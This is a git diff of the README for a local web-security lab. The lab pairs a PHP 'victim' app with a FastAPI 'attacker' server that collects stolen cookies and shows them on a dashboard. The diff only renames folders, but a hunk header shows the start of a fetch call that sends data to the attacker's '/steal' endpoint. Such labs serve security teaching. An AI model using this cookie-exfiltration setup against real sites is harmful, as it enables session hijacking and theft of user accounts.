@@ -35,10 +35,10 @@ Run it **ONLY locally**, never on a public server.
 
 ## ▶️ Start the PHP app
 
-Inside the `php-victim-app` folder:
+Inside the `Victim` folder:
 
 ```bash
-cd php-victim-app
+cd Victim
 php -S 127.0.0.1:3000
 ```
 
@@ -64,7 +64,7 @@ pip install fastapi uvicorn
 Run:
 
 ```bash
-cd attacker-server
+cd Attacker
 uvicorn main:app --reload --host 127.0.0.1 --port 8000
 or
 fastapi dev main.py
@@ -103,7 +103,7 @@ fetch("http://127.0.0.1:8000/steal", {
 Located at:
 
 ```
-attacker-server/dashboard.html
+Attacker/dashboard.html
 ```
 
 Features:
@@ -122,7 +122,7 @@ Features:
 Stored at:
 
 ```
-attacker-server/stolen_cookies.txt
+Attacker/stolen_cookies.txt
 ```
 
 Example format:
